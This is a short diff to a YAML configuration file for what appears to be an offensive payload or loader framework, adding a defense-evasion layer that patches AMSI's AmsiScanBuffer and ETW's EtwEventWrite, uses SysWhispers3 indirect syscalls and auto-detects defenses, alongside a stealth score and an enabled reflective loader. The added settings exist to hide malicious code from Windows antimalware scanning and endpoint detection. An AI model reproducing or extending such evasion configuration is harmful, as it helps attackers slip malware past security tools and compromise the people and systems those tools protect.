@@ -15,6 +15,22 @@ metrics:
   stealth_score: 0.60           # Moderate-high stealth
   reliability: 0.85             # Good reliability
 
+# AMSI & ETW Bypass Layer
+bypass_layer: "both"            # none, amsi, etw, both
+bypass_config:
+  amsi:
+    enabled: true
+    technique: "patch_amsi_scan_buffer"
+  etw:
+    enabled: true
+    patch_etw_event_write: true
+  indirect_syscalls:
+    enabled: true
+    technique: "syswhispers3"
+  api_unhooking:
+    enabled: false              # Not needed for standard EDR
+  auto_detect_defenses: true
+
 # Reflective Loading - ENABLED
 reflective_loader:
   enabled: true
